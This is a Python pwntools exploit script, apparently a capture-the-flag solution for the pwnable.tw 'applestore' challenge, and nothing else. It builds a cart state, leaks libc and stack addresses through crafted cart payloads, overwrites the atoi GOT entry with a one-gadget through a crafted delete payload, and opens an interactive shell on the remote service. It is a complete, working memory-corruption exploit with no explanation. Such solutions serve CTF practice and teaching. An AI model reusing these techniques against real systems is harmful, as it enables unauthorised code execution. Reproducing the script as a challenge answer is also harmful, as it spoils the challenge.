from pwn import *

local = False
elf = 'applestore' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "chall.pwnable.tw"
    port = 10104
    r = remote(ip,port)

context.arch = 'i386'
l = ELF('./libc_32.so.6')


def add(num):
    r.recv()
    r.sendline('2 ')
    r.recv()
    r.sendline(num)

def checkout():
    r.recvuntil('>')
    r.sendline('5')
    r.recvuntil('>')
    r.sendline('y')

def cart(payload):
    r.recvuntil('>')
    r.sendline('4')
    r.recvuntil('>')
    r.sendline(payload)

def delete(payload):
    r.recvuntil('>')
    r.sendline('3')
    r.recvuntil('>')
    r.sendline(payload)

raw_input("aaa")

for i in range(20):
    add('2 ')

for i in range(6):
    add('1 ')
checkout()
print "send payload"
libc_start_got = 0x804b034

payload = 'ya' + p32(libc_start_got) + '\x00' * 8
cart(payload)
r.recvuntil("27: ")

l.address = u32(r.recv(4)) -  l.sym.__libc_start_main
success("libc : %s",hex(l.address))
success("environ : %s",hex(l.sym.environ))

payload = 'ya' + p32( l.sym.environ) + '\x00' * 8
cart(payload)
r.recvuntil("27: ")
stack =  u32(r.recv(4))
success("stack : %s",hex(stack))

onegadget = l.address + 0x3a819
atoi_got = 0x804b040

payload = '27' + p32( stack) + p32(0) + p32( atoi_got + 0x22 ) + p32(stack - 0x100 - 0xc)
delete(payload)
r.recvuntil('>')
r.sendline(p32(onegadget))
r.interactive()